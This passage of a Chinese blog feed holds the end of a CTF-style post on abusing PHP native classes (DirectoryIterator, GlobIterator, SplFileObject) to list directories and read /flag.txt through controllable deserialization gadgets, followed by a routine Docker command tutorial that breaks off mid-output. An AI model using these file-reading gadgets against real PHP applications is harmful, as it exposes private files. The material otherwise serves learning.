class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure><p> 也可以通过目录穿越，确定我们已知的文件的<strong>具体路径</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob://./././flag.txt&quot;</span>);  <span class="comment">//目录穿越</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure><h3 id="FilesystemIterator-类"><a href="#FilesystemIterator-类" class="headerlink" title="FilesystemIterator 类"></a>FilesystemIterator 类</h3><p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p><p>该类的使用方法与DirectoryIterator 类也是基本相同的。</p><h3 id="GlobIterator-类"><a href="#GlobIterator-类" class="headerlink" title="GlobIterator 类"></a>GlobIterator 类</h3><p><strong>GlobIterator 类</strong>也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()函数，可以通过模式匹配来寻找文件路径。使用这个类不需要额外写上glob://</p><p>Directorylterator类 与 FilesystemIterator 类当我们使用echo函数输出的时候，会触发这两个类中的 __toString() 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的。而GlobIterator 类在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&quot;f*txt&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure><h2 id="可读取文件类"><a href="#可读取文件类" class="headerlink" title="可读取文件类"></a>可读取文件类</h2><p>SplFileObject 类和 SplFileinfo为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure><p>但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$tmp</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$tmp</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最后，形如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">key</span>(<span class="variable">$this</span>-&gt;value);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span> -&gt; a = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">key</span>(<span class="variable">$this</span>-&gt;value);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br></pre></td></tr></table></figure><p>没有pop链的思路和可利用反序列化的函数，一般就是需要用原生类了。</p><p>只需要让<strong>$this-&gt;key</strong>值赋为我们想用原生函数，<strong>$this-&gt;value</strong>赋为路径，查就行了。但是这种构造类型的方法的局限性就是只能查一个路径上的第一个文件。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker</title>
      <link href="/2023/07/26/Docker/"/>
      <url>/2023/07/26/Docker/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>官网：<a href="https://www.docker.com/">Docker</a></p><p>文档地址：<a href="https://docs.docker.com/">Docker Docs</a></p><p>仓库地址：<a href="https://hub-stage.docker.com/">Docker Hub</a><br>                    <a href="https://dashboard.daocloud.io/">DaoCloud</a></p><p>Docker是基于Go语言开发的开源项目！</p><h2 id="Docker的基本组成"><a href="#Docker的基本组成" class="headerlink" title="Docker的基本组成"></a>Docker的基本组成</h2><p><strong>镜像（image）：</strong></p><p>Docker镜像就好比是一个模板，可以通过这个模板来创建容器服务，通过这个镜像可以创建多个容器（最终服务运行或者项目运行就是在容器中的）</p><p><strong>容器（container）：</strong></p><p>Docker利用容器技术，独立运行一个或者一个组应用，通过这个镜像来创建的</p><p>启动，停止，删除，基本命令</p><p>可以把这个容器理解为就是一个简易的linux系统</p><p><strong>仓库（repository）：</strong></p><p>仓库就是存放镜像的地方</p><p>仓库分为公有仓库和私有仓库</p><h2 id="Run流程"><a href="#Run流程" class="headerlink" title="Run流程"></a>Run流程</h2><p><img src="/img/Docker/1.png" alt=""></p><h1 id="Docker的常用命令"><a href="#Docker的常用命令" class="headerlink" title="Docker的常用命令"></a>Docker的常用命令</h1><h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker version#显示docker的版本信息</span><br><span class="line">docker info#显示</span><br><span class="line">docker 命令 --help#万能命令</span><br></pre></td></tr></table></figure><p>帮助文档的地址：<a href="https://docs.docker.com/reference/">Reference</a></p><h2 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h2><p><strong>docker images</strong> 查看所有本地的主机上的镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@lemon-virtual-machine:/# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">hello-world   latest    9c7a54a9a43c   2 months ago   13.3kB</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解释</span></span><br><span class="line">REPOSITORY  # 镜像的仓库源</span><br><span class="line">TAG# 镜像的标签</span><br><span class="line">IMAGE ID# 镜像的id</span><br><span class="line">CREATED# 镜像的创建时间</span><br><span class="line">SIZE# 镜像的大小</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可选项</span></span><br><span class="line">  -a, --all             # 列出所有镜像</span><br><span class="line">  -q, --quiet           # 只显示镜像的id</span><br></pre></td></tr></table></figure><p><strong>docker search</strong> 搜索镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@lemon-virtual-machine:/# docker search mysql</span><br><span class="line">NAME                            DESCRIPTION                                      STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                           MySQL is a widely used, open-source relation…   14316     [OK]       </span><br><span class="line">mariadb                         MariaDB Server is a high performing open sou…   5465      [OK]       </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可选项，通过搜索来过滤</span></span><br><span class="line"> --filter=STARS=3000# 搜索出来的镜像就是STARS大于3000的</span><br><span class="line">root@lemon-virtual-machine:/# docker search mysql --filter=STARS=3000</span><br><span class="line">NAME      DESCRIPTION                                      STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql     MySQL is a widely used, open-source relation…   14316     [OK]       </span><br><span class="line">mariadb   MariaDB Server is a high performing open sou…   5465      [OK]    </span><br></pre></td></tr></table></figure><p><strong>docker pull</strong> 下载镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载镜像 docker pull 镜像名[:tag]</span></span><br><span class="line">root@lemon-virtual-machine:/# docker pull mysql</span><br><span class="line">Using default tag: latest# 如果不写tag，默认就是latest</span><br><span class="line">latest: Pulling from library/mysql </span><br><span class="line">72a69066d2fe: Pull complete# 分层下载，docker image的核心 联合文件系统</span><br><span class="line">93619dbc5b36: Pull complete </span><br><span class="line">99da31dd6142: Pull complete </span><br><span class="line">626033c43d70: Pull complete </span><br><span class="line">37d5d7efb64e: Pull complete </span><br><span class="line">ac563158d721: Pull complete </span><br><span class="line">d2ba16033dad: Pull complete </span><br><span class="line">688ba7d5c01a: Pull complete </span><br><span class="line">00e060b6d11d: Pull complete </span><br><span class="line">1c04857f594f: Pull complete </span><br><span class="line">4d7cfa90e6ea: Pull complete </span><br><span class="line">e0431212d27d: Pull complete </span><br><span class="line">Digest: sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709# 签名</span><br><span class="line">Status: Downloaded newer image for mysql:latest</span><br><span class="line">docker.io/library/mysql:latest # 真实地址</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">等价</span></span><br><span class="line">docker pull mysql</span><br><span class="line">docker pull docker.io/library/mysql:latest</span><br></pre></td></tr></table></figure><p><strong>docker rmi</strong> 删除镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@lemon-virtual-machine:/# docker rmi -f 镜像id# 删除指定镜像</span><br><span class="line">root@lemon-virtual-machine:/# docker rmi -f 镜像id 镜像id 镜像id# 删除多个镜像</span><br><span class="line">root@lemon-virtual-machine:/# docker rmi -f $(docker images -aq)# 删除全部的镜像</span><br></pre></td></tr></table></figure><h2 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h2><p><strong>说明：我们有了镜像才可以创建容器，linux，下载一个centos镜像来测试学习</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull centos</span><br></pre></td></tr></table></figure><p><strong>新建容器并启动</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">docker run [可选参数] image</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">参数说明</span></span><br><span class="line">--name=&quot;Name&quot;# 容器名字 用来区分容器</span><br><span class="line">-d# 后台方式启动</span><br><span class="line">-it# 使用交互方式运行，进入容器查看内容</span><br><span class="line">-p# 指定容器的端口 -p 8080:8080</span><br><span class="line">-p ip:主机端口:容器端口</span><br><span class="line">-p 主机端口:容器端口（常用）</span><br><span class="line">-p 容器端口</span><br><span class="line">容器端口</span><br><span class="line">-P# 随机指定端口</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试，启动并进入容器</span></span><br><span class="line">root@lemon-virtual-machine:/# docker run -it centos /bin/bash</span><br><span class="line">[root@901b12b8ffac /]# ls # 查看容器内的centos,基础版本，很多命令都是不完善的！</span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从容器中退回主机</span></span><br><span class="line">[root@901b12b8ffac /]# exit</span><br><span class="line">exit</span><br><span class="line">root@lemon-virtual-machine:/# ls</span><br><span class="line">bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  swapfile  tmp  var</span><br><span class="line">boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   sys       usr</span><br></pre></td></tr></table></figure><p><strong>列出所有的运行中的容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker ps 命令</span></span><br><span class="line">   # 列出当前正在运行的的容器</span><br><span class="line">-a # 列出当前正在运行的的容器+带出历史运行的容器</span><br><span class="line">-n=?# 显示最近创建的容器</span><br><span class="line">-q# 只显示容器的编号</span><br><span class="line"></span><br><span class="line">root@lemon-virtual-machine:/# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">root@lemon-virtual-machine:/# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE         COMMAND       CREATED         STATUS                          PORTS     NAMES</span><br><span class="line">901b12b8ffac   centos        &quot;/bin/bash&quot;   5 minutes ago   Exited (0) About a minute ago             sharp_saha</span><br><span class="line">684d99f91679   hello-world   &quot;/hello&quot;      23 hours ago    Exited (0) 23 hours ago                   festive_noeth</span><br></pre></td></tr></table></figure><p><strong>退出容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit# 直接容器停止并推出</span><br><span class="line">Ctrl + P + Q# 容器不停止推出</span><br></pre></td></tr></table></figure><p><strong>删除容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker rm 容器id# 删除指定的容器，不能删除正在运行的容器，如果要强制删除rm -f</span><br><span class="line">docker rm -f $(docker ps -aq)# 删除所有的容器</span><br><span class="line">docker ps -a -q | xargs docker rm# 删除所有的容器</span><br></pre></td></tr></table></figure><p><strong>启动和停止容器的操作</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker start 容器id# 启动容器</span><br><span class="line">docker restart 容器id# 重启容器</span><br><span class="line">docker stop 容器id# 停止当前正在运行的容器</span><br><span class="line">docker kill 容器id# 强制停止当前容器</span><br></pre></td></tr></table></figure><h2 id="常用的其他命令"><a href="#常用的其他命令" class="headerlink" title="常用的其他命令"></a>常用的其他命令</h2><p><strong>后台启动容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令 docker run -d 镜像名</span></span><br><span class="line">root@lemon-virtual-machine:/# docker run -d centos</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">问题 docker ps，发现centos停止了</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常见的坑，docker容器使用后台运行，就必须有一个前台进程，docker发现没有应用，就会自动停止</span></span><br></pre></td></tr></table></figure><p><strong>查看日志命令</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f -tf --tail 容器</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示日志</span></span><br><span class="line">-tf# 显示日志</span><br><span class="line">--tail number# 要显示的日志条数</span><br><span class="line">root@lemon-virtual-machine:/# docker logs -tf --tail 10 efc35b90e983</span><br></pre></td></tr></table></figure><p><strong>查看容器中近程信息</strong> ps</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令 docker top 容器<span class="built_in">id</span></span></span><br><span class="line">root@lemon-virtual-machine:/# docker top e6f07538e8c5</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                6137                6117                0                   17:52               pts/0               00:00:00            /bin/bash</span><br></pre></td></tr></table></figure><p><strong>查看镜像的元数据</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令</span></span><br><span class="line">docker inspect 容器id</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试</span></span><br><span class="line">root@lemon-virtual-machine:/# docker inspect e6f07538e8c5</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Id&quot;: &quot;e6f07538e8c560a46ebc8c2669d5ea307483a97cdfaaf6abb1dc7b3dfe8acf5b&quot;,</span><br><span class="line">        &quot;Created&quot;: &quot;2023-07-16T09:51:59.93652686Z&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;/bin/bash&quot;,</span><br><span class="line">        &quot;Args&quot;: [],</span><br><span class="line">        &quot;State&quot;: &#123;</span><br><span class="line">            &quot;Status&quot;: &quot;running&quot;,</span><br><span class="line">            &quot;Running&quot;: true,</span><br><span class="line">            &quot;Paused&quot;: false,</span><br><span class="line">            &quot;Restarting&quot;: false,</span><br><span class="line">            &quot;OOMKilled&quot;: false,</span><br><span class="line">            &quot;Dead&quot;: false,</span><br><span class="line">            &quot;Pid&quot;: 6137,</span><br><span class="line">            &quot;ExitCode&quot;: 0,</span><br><span class="line">            &quot;Error&quot;: &quot;&quot;,</span><br><span class="line">            &quot;StartedAt&quot;: &quot;2023-07-16T09:52:00.159486535Z&quot;,</span><br><span class="line">            &quot;FinishedAt&quot;: &quot;0001-01-01T00:00:00Z&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Image&quot;: &quot;sha256:5d0da3dc976460b72c77d94c8a1ad043720b0416bfc16c52c45d4847e53fadb6&quot;,</span><br><span class="line">        &quot;ResolvConfPath&quot;: &quot;/var/lib/docker/containers/e6f07538e8c560a46ebc8c2669d5ea307483a97cdfaaf6abb1dc7b3dfe8acf5b/resolv.conf&quot;,</span><br><span class="line">        &quot;HostnamePath&quot;: &quot;/var/lib/docker/containers/e6f07538e8c560a46ebc8c2669d5ea307483a97cdfaaf6abb1dc7b3dfe8acf5b/hostname&quot;,</span><br><span class="line">        &quot;HostsPath&quot;: &quot;/var/lib/docker/containers/e6f07538e8c560a46ebc8c2669d5ea307483a97cdfaaf6abb1dc7b3dfe8acf5b/hosts&quot;,</span><br><span class="line">        &quot;LogPath&quot;: &quot;/var/lib/docker/containers/e6f07538e8c560a46ebc8c2669d5ea307483a97cdfaaf6abb1dc7b3dfe8acf5b/e6f07538e8c560a46ebc8c2669d5ea307483a97cdfaaf6abb1dc7b3dfe8acf5b-json.log&quot;,</span><br><span class="line">        &quot;Name&quot;: &quot;/frosty_goldwasser&quot;,</span><br><span class="line">        &quot;RestartCount&quot;: 0,</span><br><span class="line">        &quot;Driver&quot;: &quot;overlay2&quot;,</span><br><span class="line">        &quot;Platform&quot;: &quot;linux&quot;,</span><br><span class="line">        &quot;MountLabel&quot;: &quot;&quot;,</span><br><span class="line">        &quot;ProcessLabel&quot;: &quot;&quot;,</span><br><span class="line">        &quot;AppArmorProfile&quot;: &quot;docker-default&quot;,</span><br><span class="line">        &quot;ExecIDs&quot;: null,</span><br><span class="line">        &quot;HostConfig&quot;: &#123;</span><br><span class="line">            &quot;Binds&quot;: null,</span><br><span class="line">            &quot;ContainerIDFile&quot;: &quot;&quot;,</span><br><span class="line">            &quot;LogConfig&quot;: &#123;</span><br><span class="line">                &quot;Type&quot;: &quot;json-file&quot;,</span><br><span class="line">                &quot;Config&quot;: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;NetworkMode&quot;: &quot;default&quot;,</span><br><span class="line">            &quot;PortBindings&quot;: &#123;&#125;,</span><br><span class="line">            &quot;RestartPolicy&quot;: &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;no&quot;,</span><br><span class="line">                &quot;MaximumRetryCount&quot;: 0</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;AutoRemove&quot;: false,</span><br><span class="line">            &quot;VolumeDriver&quot;: &quot;&quot;,</span><br><span class="line">            &quot;VolumesFrom&quot;: null,</span><br><span class="line">            &quot;ConsoleSize&quot;: [</span><br><span class="line">                36,</span><br><span class="line">                141</span><br><span class="line">            ],</span><br><span class="line">            &quot;CapAdd&quot;: null,</span><br><span class="line">            &quot;CapDrop&quot;: null,</span><br><span class="line">            &quot;CgroupnsMode&quot;: &quot;private&quot;,</span><br><span class="line">            &quot;Dns&quot;: [],</span><br><span class="line">            &quot;DnsOptions&quot;: [],</span><br><span class="line">            &quot;DnsSearch&quot;: [],</span><br><span class="line">            &quot;ExtraHosts&quot;: null,</span><br><span class="line">            &quot;GroupAdd&quot;: null,</span><br><span class="line">            &quot;IpcMode&quot;: &quot;private&quot;,</span><br><span class="line">            &quot;Cgroup&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Links&quot;: null,</span><br><span class="line">            &quot;OomScoreAdj&quot;: 0,</span><br><span class="line">            &quot;PidMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Privileged&quot;: false,</span><br><span class="line">            &quot;PublishAllPorts&quot;: false,</span><br><span class="line">            &quot;ReadonlyRootfs&quot;: false,</span><br><span class="line">            &quot;SecurityOpt&quot;: null,</span><br><span class="line">            &quot;UTSMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;UsernsMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;ShmSize&quot;: 67108864,</span><br><span class="line">            &quot;Runtime&quot;: &quot;runc&quot;,</span><br><span class="line">            &quot;Isolation&quot;: &quot;&quot;,</span><br><span class="line">            &quot;CpuShares&quot;: 0,</span><br><span class="line">            &quot;Memory&quot;: 0,</span><br><span class="line">            &quot;NanoCpus&quot;: 0,</span><br><span class="line">            &quot;CgroupParent&quot;: &quot;&quot;,</span><br><span class="line">            &quot;BlkioWeight&quot;: 0,</span><br><span class="line">            &quot;BlkioWeightDevice&quot;: [],</span><br><span class="line">            &quot;BlkioDeviceReadBps&quot;: [],</span><br><span class="line">            &quot;BlkioDeviceWriteBps&quot;: [],</span><br><span class="line">            &quot;BlkioDeviceReadIOps&quot;: [],</span><br><span class="line">            &quot;BlkioDeviceWriteIOps&quot;: [],</span><br><span class="line">            &quot;CpuPeriod&quot;: 0,</span><br><span class="line">            &quot;CpuQuota&quot;: 